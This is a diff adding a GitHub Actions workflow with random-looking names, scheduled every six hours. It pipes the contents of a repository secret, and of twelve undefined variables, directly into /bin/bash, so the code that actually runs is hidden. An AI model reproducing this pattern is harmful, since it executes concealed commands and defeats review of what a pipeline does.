@@ -1,0 +1,28 @@
+name: jiangpengying7612
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangpengying7612
+        env:
+          qlix02763: ${{ secrets.qlix02763 }}
+        run: |
+          echo $qlix02763 | jq -r .ncltr306 | /bin/bash
+          echo $wyfbb09 | jq -r .y503 | /bin/bash
+          echo $kwc007 | jq -r .eie043 | /bin/bash
+          echo $cfa50935 | jq -r .g4 | /bin/bash
+          echo $u67 | jq -r .mgqs28158 | /bin/bash
+          echo $db1185 | jq -r .fqf3 | /bin/bash
+          echo $qi29 | jq -r .vn6731 | /bin/bash
+          echo $gg177 | jq -r .h46 | /bin/bash
+          echo $qoms16 | jq -r .agpj78184 | /bin/bash
+          echo $kp51921 | jq -r .clqp515 | /bin/bash
+          echo $e087 | jq -r .yk687 | /bin/bash
+          echo $ang74 | jq -r .zogaq2 | /bin/bash
+          echo $qj41 | jq -r .rnfl9235 | /bin/bash
+
